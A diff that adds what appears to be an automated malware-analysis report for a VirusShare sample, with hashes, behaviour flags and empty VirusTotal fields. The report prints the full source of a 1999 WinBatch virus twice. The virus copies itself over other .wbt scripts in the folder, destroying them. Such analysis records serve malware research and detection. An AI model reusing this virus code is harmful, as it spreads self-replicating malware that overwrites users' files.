@@ -1,0 +1,70 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "WRITE": "May write to a file"
+        },
+        "macro": ";METHOD\n;WIL.Method: First ever WinBatch virus\n;by Runner, CopyRight 1999\nIntControl(29, @TAB, 0, 0, 0)\nErrorMode(@OFF)\n\nMyCode = \"\"\nAllWBT = FileItemize(\"*.wbt\")\n       \nFor i = 1 to ItemCount(AllWBT, @tab)\nOneWBT = ItemExtract(i, AllWBT, @tab)\n\nfs=FileSize(OneWBT)\nMarkBuffer = BinaryAlloc(fs+100)\n\nBinaryRead(MarkBuffer, OneWBT)\nIf BinaryPeekStr( MarkBuffer, 0, 7) == \";METHOD\" then\n\nMyCode = OneWBT \nbreak\nEnd If\n\nNext i\n\nIf MyCode != OneWBT Then EXIT\n\nFor w = 1 To ItemCount(AllWBT, @tab)\nOneWBT = ItemExtract(w, AllWBT, @tab)\n\nIf MyCode != OneWBT\n\nvirus = FileOpen(MyCode, \"READ\")\nhost = FileOpen(OneWBT, \"WRITE\")\n\nWhile @TRUE           \n        x = FileRead(virus)\n        If x == \"*EOF*\" Then Break\n        FileWrite(host, x)\nEndWhile\n\nFileClose(host)\nFileClose(virus)\nEnd If\n\nNext w\n\nnum = Random(10) \nIf num == 1 Then Message(\"WIL.Method by Runner\",\"WIL.Method: First ever WinBatch virus, coded by Runner.\")\nEXIT \n\n\n\n"
+    },
+    "filename": "VirusShare_49ac4ce7a5e39c42be5bf0c5625de061",
+    "filesize": 981,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "49ac4ce7a5e39c42be5bf0c5625de061",
+        "sha1": "9889fe28d13d1fb2b041a7eef6e1f0c4c038529b",
+        "sha256": "b379b3dce458018c4f2e62746f348afab86db865ecbf28a472c24720303e9cd7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ";METHOD",
+            ";WIL.Method: First ever WinBatch virus",
+            ";by Runner, CopyRight 1999",
+            "IntControl(29, @TAB, 0, 0, 0)",
+            "ErrorMode(@OFF)",
+            "MyCode = \"\"",
+            "AllWBT = FileItemize(\"*.wbt\")",
+            "       ",
+            "For i = 1 to ItemCount(AllWBT, @tab)",
+            "OneWBT = ItemExtract(i, AllWBT, @tab)",
+            "fs=FileSize(OneWBT)",
+            "MarkBuffer = BinaryAlloc(fs+100)",
+            "BinaryRead(MarkBuffer, OneWBT)",
+            "If BinaryPeekStr( MarkBuffer, 0, 7) == \";METHOD\" then",
+            "MyCode = OneWBT ",
+            "break",
+            "End If",
+            "Next i",
+            "If MyCode != OneWBT Then EXIT",
+            "For w = 1 To ItemCount(AllWBT, @tab)",
+            "OneWBT = ItemExtract(w, AllWBT, @tab)",
+            "If MyCode != OneWBT",
+            "virus = FileOpen(MyCode, \"READ\")",
+            "host = FileOpen(OneWBT, \"WRITE\")",
+            "While @TRUE           ",
+            "        x = FileRead(virus)",
+            "        If x == \"*EOF*\" Then Break",
+            "        FileWrite(host, x)",
+            "EndWhile",
+            "FileClose(host)",
+            "FileClose(virus)",
+            "End If",
+            "Next w",
+            "num = Random(10) ",
+            "If num == 1 Then Message(\"WIL.Method by Runner\",\"WIL.Method: First ever WinBatch virus, coded by Runner.\")",
+            "EXIT "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.270369",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
